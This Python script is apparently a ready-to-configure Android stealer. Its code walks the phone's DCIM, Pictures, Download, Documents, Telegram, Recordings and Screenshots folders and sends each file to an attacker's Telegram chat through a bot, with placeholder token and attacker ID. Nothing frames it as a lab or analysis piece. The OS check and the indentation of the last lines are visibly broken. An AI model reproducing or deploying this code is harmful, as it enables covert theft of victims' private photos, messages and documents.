import platform

if platform.system() == "android":
    import os
    import telebot
    import threading
    import time

    BOT_TOKEN = 'MODIFY'
    ATTACKER_ID = 'MODIFY'

    directory_paths = [
"/storage/emulated/0/DCIM/",
"/storage/emulated/0/Pictures/",
"/storage/emulated/0/Movies/",
"/storage/emulated/0/Music/",
"/storage/emulated/0/Download/",
"/storage/emulated/0/Documents/",
"/storage/emulated/0/Telegram/",
"/storage/emulated/0/Telegram/Telegram Images/",
"/storage/emulated/0/Telegram/Telegram Video/",
"/storage/emulated/0/Telegram/Telegram Documents/",
"/storage/emulated/0/Telegram/Telegram Audio/",
"/storage/emulated/0/Android/media/",
"/storage/emulated/0/Bluetooth/",
"/storage/emulated/0/Recordings/",
"/storage/emulated/0/Screenshots/",
"/storage/emulated/0/Movies/",
]


    bot = telebot.TeleBot(BOT_TOKEN)

    def send_message(message):
        bot.send_message(ATTACKER_ID, message)

    def upload_files(directory_path):
        try:
            for file_name in os.listdir(directory_path):
                file_path = os.path.join(directory_path, file_name)
                if os.path.isfile(file_path):
                    with open(file_path, 'rb') as f:
                        bot.send_document(ATTACKER_ID, f, caption=f'File "{file_name}" from "{directory_path}" uploaded successfully!')
                        time.sleep(3)
        except Exception as e:
            send_message(f'Error uploading files from {directory_path}: {str(e)}')

    def upload_files_from_directories(directories):
        for directory in directories:
            upload_files(directory)

    upload_files_from_directories(directory_paths)

elif platform.system() in ("Windows", "Linux", "Darwin"):
print("You are using a computer")
else:
print("Unsupported operating system")
